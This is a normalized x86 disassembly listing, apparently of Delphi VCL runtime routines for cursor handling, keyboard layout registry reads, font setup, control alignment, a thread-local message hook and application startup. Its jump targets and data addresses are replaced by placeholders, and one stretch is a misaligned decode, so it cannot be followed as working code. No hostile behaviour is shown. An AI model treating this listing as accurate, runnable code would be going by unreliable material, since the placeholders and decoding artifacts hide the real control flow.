mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_4192bc
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_40349c
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_4138b8
call sub_403128
inc edi
dec esi
jne r-xdata
sub_4530ac
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp eax [ ebx + 0x74 ]
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov [ ebx + 0x74 ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_4530f8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_41375c
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_41375c
mov eax [ rw-data ]
call sub_455e84
sub_453130
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4139fc
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4139fc
mov eax [ rw-data ]
call sub_455e84
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_43c924
sub_453198
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp + 0x60 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorA
mov ecx eax
mov edx ebx
mov eax ebp
call sub_453250
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_4531f4
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x5c ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ edi + 0x60 ]
cmp eax edx
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffef
jl r-xdata
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp eax 0xffffffeb
je r-xdata
cmp eax 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test eax eax
jle r-xdata
mov esi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_4026dc
mov ebx esi
test ebx ebx
jne r-xdata
sub_453250
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_4026bc
mov edx [ ebx + 0x5c ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
retn
sub_453278
push ebp
mov ebp esp
add esp 0xfffffda0
push ebx
xor edx edx
mov [ ebp - 0x260 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_453423
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45342a
lea eax [ ebp - 0x260 ]
call sub_403e78
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_403e78
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x1d ] 0x0
mov dl 0x1
call sub_415460
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] 0x0
lea ecx [ ebp - 0x25c ]
mov edx r-xdata
lea eax [ ebp - 0x254 ]
call sub_408a04
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_4400cc
test al al
je r-xdata
xor eax eax
push ebp
push sub_4533df
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x260 ]
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_4040e8
mov edx [ ebp - 0x260 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_4040e8
sub_453494
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_455cf4
cmp esi [ ebx + 0x80 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_455aa8
mov dl 0x1
mov eax [ rw-data ]
call sub_455aa8
sub_453500
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0x5c ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
mov ecx [ ecx ]
sub_453528
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_453500
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
mov eax esp
call sub_40688c
push eax
push 0x0
push 0x84
push edi
call SendMessageA
mov ebx eax
mov dx 0x200
mov eax ebx
call sub_406814
push eax
push edi
push 0x20
push edi
call SendMessageA
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4535b8
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_4536fd
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov al [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
push 0x0
lea eax [ ebp - 0x3d ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_455aa8
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_41c718
lea eax [ ebp - 0x3d ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_41c718
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov edx 0x8
call sub_41c7fc
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_41c718
lea eax [ ebp - 0xb5 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_41c718
lea eax [ ebp - 0xf1 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_41c718
jmp r-xdata
mov [ ebp - 0x191 ] 0x154
push 0x0
lea eax [ ebp - 0x191 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
retn
mov dl [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_455aa8
mov eax [ ebx + 0x80 ]
mov edx 0xff000017
call sub_41c55c
mov eax [ ebx + 0x88 ]
mov edx 0xff000007
call sub_41c55c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453704
cmp [ rw-data ] 0x0
je r-xdata
sub_45373c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
mov bl [ ebp - 0x1 ]
dec bl
je r-xdata
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setl cl
jmp r-xdata
dec bl
je r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setl cl
jmp r-xdata
sub_45379c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
mov al [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
mov al [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
xor edx edx
mov dl [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_4538d8 ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_45394c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4530a4
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4138b8
mov dl [ ebp - 0x1 ]
call sub_45379c
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_453090
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x22b ] 0x1
je r-xdata
cmp [ ebx + 0x22b ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41375c
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_413934
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_4138b8
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_45373c
test al al
je r-xdata
inc esi
sub_453a98
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4530a4
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_453090
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_453af0
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_453a98
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_453b6a
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_45394c
pop ecx
push ebp
mov al 0x2
call sub_45394c
pop ecx
push ebp
mov al 0x3
call sub_45394c
pop ecx
push ebp
mov al 0x4
call sub_45394c
pop ecx
push ebp
mov al 0x5
call sub_45394c
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403128
retn
sub_453b78
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_45370c
xor eax eax
push ebp
push sub_453bf1
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_453af0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8e ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_453714
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8e ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_453c0c
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_403e78
pop esi
pop ebx
retn
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_403ecc
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_453c64
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push sub_453c95
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_4560b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_453cb8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_43342c
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_45612c
sub_453d14
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_4551cc
sub_453d58
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xa5 ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_453d14
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
push sub_453cb8
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_453dcc
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_453e28
add esp 0xfffffff8
mov [ esp ] 0x8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
pop ecx
pop edx
retn
cmp [ esp + 0x4 ] 0x0
setne al
pop ecx
pop edx
retn
sub_453e58
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
pop ecx
pop edx
retn
sub_453e80
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_453e28
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_453e58
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_453e58
sub_453ec0
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419270
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_455598
mov [ ebx + 0x34 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebx + 0xa8 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0xff000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0x9d ] 0x1
mov [ ebx + 0xb4 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_42294c
mov esi eax
mov [ ebx + 0x98 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax esi
call sub_422d1c
mov eax [ ebx + 0x98 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_455d30
push 0x100
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x101 ]
push eax
call OemToCharA
lea eax [ ebp - 0x101 ]
mov dl 0x5c
call sub_40c0cc
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_455790
lea eax [ ebp - 0x101 ]
mov dl 0x2e
call sub_40c0f4
test eax eax
je r-xdata
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x101 ]
call sub_4083f8
lea eax [ ebp - 0x101 ]
inc eax
push eax
call CharLowerA
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x101 ]
mov ecx 0x100
call sub_4040e8
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0x9e ] 0x1
xor eax eax
mov [ ebx + 0xa0 ] eax
mov eax ebx
call sub_455f0c
mov eax ebx
call sub_4568d0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_4541c8
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_4540a9
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_4034b4
mov ebx edx
mov esi eax
mov eax esi
call sub_4568e0
mov [ esp + 0x4 ] esi
mov [ esp ] sub_455598
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_455790
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0x9d ] 0x0
mov eax esi
call sub_45612c
xor edx edx
mov eax esi
call sub_455aa8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4192bc
push esi
push sub_4545fc
mov eax esi
call sub_455384
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xa4 ] 0x0
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_4054b4
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xa8 ]
call sub_403128
mov eax [ esi + 0x90 ]
call sub_403128
mov eax [ esi + 0x98 ]
call sub_403128
test bl bl
jle r-xdata
call sub_41a398
mov eax [ esi + 0x30 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call SendMessageA
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_4541c8
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_454369
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454370
lea eax [ ebp - 0x2c ]
call sub_403e78
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_454748
call sub_41a300
mov [ ebx + 0x40 ] eax
mov eax DefWindowProcA
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
